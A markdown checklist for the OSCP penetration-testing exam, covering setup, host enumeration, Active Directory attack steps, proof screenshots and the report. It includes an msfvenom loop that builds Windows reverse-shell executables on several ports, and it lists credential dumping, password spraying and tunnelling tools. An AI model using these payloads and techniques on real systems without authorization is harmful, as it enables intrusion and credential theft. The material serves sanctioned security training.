# Exam-Day Checklist

Print or keep open in a second pane. Check boxes as you go.

## T-24h / setup (before exam)

- [ ] Official exam guide + FAQ re-read (proctoring, MSF limits, connectivity)
- [ ] Kali updated; VPN client tested; disk space free
- [ ] Snapshot / backup of attack VM
- [ ] Toolkit staged under one HTTP/SMB root (`tools/`, multi-port shell EXEs)
- [ ] SysReptor / OffSec-Reporting project ready (or self-hosted designs imported)
- [ ] arsenal-ng installed; alias `a`; test `set lhost=…` workflow
- [ ] Report template ready (headings, screenshot style)
- [ ] Sleep, food, water, power, secondary internet plan
- [ ] ID + room ready for proctor

### Pre-built payloads

```bash
# Example — adjust LHOST when VPN is up
for p in 443 80 53 8080 8443; do
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=PLACEHOLDER LPORT=$p \
    EXITFUNC=thread -f exe -o shell_${p}.exe
done
```

- [ ] winPEAS, linPEAS, pspy, PowerUp, PowerView
- [ ] PrintSpoofer / GodPotato, Rubeus, procdump, chisel/ligolo agent
- [ ] SeBackupPrivilege DLLs, nc.exe, RunasCs
- [ ] NetExec + Impacket verified (`nxc smb --help`)

## T-0: first 60 minutes

- [ ] VPN up; note `tun0` IP; test connectivity
- [ ] Workspace: `mkdir -p ~/exam/{scans,loot,screenshots,notes,hosts}`
- [ ] Scope list written (standalones + AD set IPs + provided AD creds)
- [ ] Quick scan all targets → full port scans started
- [ ] Report skeleton filled with host IPs
- [ ] Loot table file opened (`notes/loot.md`)

```bash
ip -br a show tun0
mkdir -p ~/exam/{scans,loot,screenshots,notes,tools}
```

## Operating rules (pin this)

| Rule | Action |
|------|--------|
| Time-box | 60–90 min stuck → park host, switch |
| Document live | Screenshots as you own, not at the end |
| Loot first | History, configs, SAM, tickets before new exploits |
| AD priority | Comfortable pass path = AD 40 + locals |
| Partials count | `local.txt` without root still scores |
| One variable | Change one thing at a time when testing |

## Per-host mini checklist

Copy per IP:

```text
Host: _______________
[ ] Full TCP ports
[ ] -sV -sC on open ports
[ ] Web dirs / vhosts (if HTTP)
[ ] SMB shares (null + auth)
[ ] UDP considered (SNMP/DNS) if TCP thin
[ ] Creds from loot table tried
[ ] Foothold + local.txt + screenshot
[ ] whoami /priv or sudo -l
[ ] Privesc + proof.txt + screenshot
[ ] Loot exported to loot.md
[ ] Pivot routes noted (if dual-homed)
```

## AD set checklist

- [ ] Provided creds tested (SMB/WinRM/LDAP/RDP)
- [ ] DNS → DC; clock skew fixed if using Kerberos
- [ ] Domain users/groups/computers enumerated
- [ ] Shares + SYSVOL/NETLOGON reviewed
- [ ] Dual-homed host identified; tunnel up (ligolo/chisel)
- [ ] Internal CIDR rescanned through tunnel
- [ ] Every new secret sprayed with `nxc --continue-on-success`
- [ ] PSReadLine history on every Windows foothold
- [ ] Local admin / SYSTEM → dump → DA material
- [ ] DC proof + screenshot with hostname/whoami/IP

## Proof screenshot standard

Same frame should show identity **and** flag:

```text
Windows: hostname + whoami + ipconfig + type ...\local.txt|proof.txt
Linux:   hostname + id + ip a + cat local/proof
```

- [ ] Filename convention: `HOST_local.png`, `HOST_proof.png`
- [ ] Flag values also pasted into report appendix table

## Shell hygiene

- [ ] Listeners pre-staged: 443, 80, 53, 8080
- [ ] Linux TTY upgraded when needed
- [ ] Windows PATH fixed if tools “not found”
- [ ] Stable working dir: `C:\Windows\Tasks` or `/tmp`

## When stuck (order)

1. Re-read full nmap + web enum output  
2. Retry **all loot passwords** on this host  
3. Check history / configs / shares again  
4. UDP / vhosts / alternate ports  
5. Park and attack another host  
6. Return after a break  

## Last 2 hours of hacking

- [ ] Stop deep rabbit holes; collect partials
- [ ] Re-verify every flag still accessible
- [ ] Re-take any missing proof screenshots
- [ ] Note cleanup actions (accounts/tools you added)
- [ ] Outline remaining report gaps

## Report window (24h)

- [ ] High-level summary + recommendations
- [ ] Methodology section
- [ ] Each host: enum table → foothold → privesc → proof
- [ ] Steps reproducible (commands + context)
- [ ] Appendix of all flag hashes
- [ ] Filename: `OSCP-OS-XXXXX-Exam-Report.pdf` (your OSID)
- [ ] SysReptor (or other) PDF export; spellcheck
- [ ] Archive: password-free `.7z`, under **200 MB**
- [ ] Upload to [upload.offsec.com](https://upload.offsec.com) early with buffer
- [ ] See [resources/reporting-sysreptor.md](../resources/reporting-sysreptor.md) · [report-outline.md](../resources/report-outline.md)

## Do not

- [ ] Share exam content publicly (NDA)
- [ ] Submit hashes to public crack sites
- [ ] Rely on memory for proof after 20+ hours
- [ ] Burn the full exam on one machine
- [ ] Use prohibited tooling (commercial Pro suites, SQLmap, mass scanners, LLM prompts, banned spoofing)
- [ ] Pivot multi-host with Metasploit exploit/Meterpreter (single-target rule)
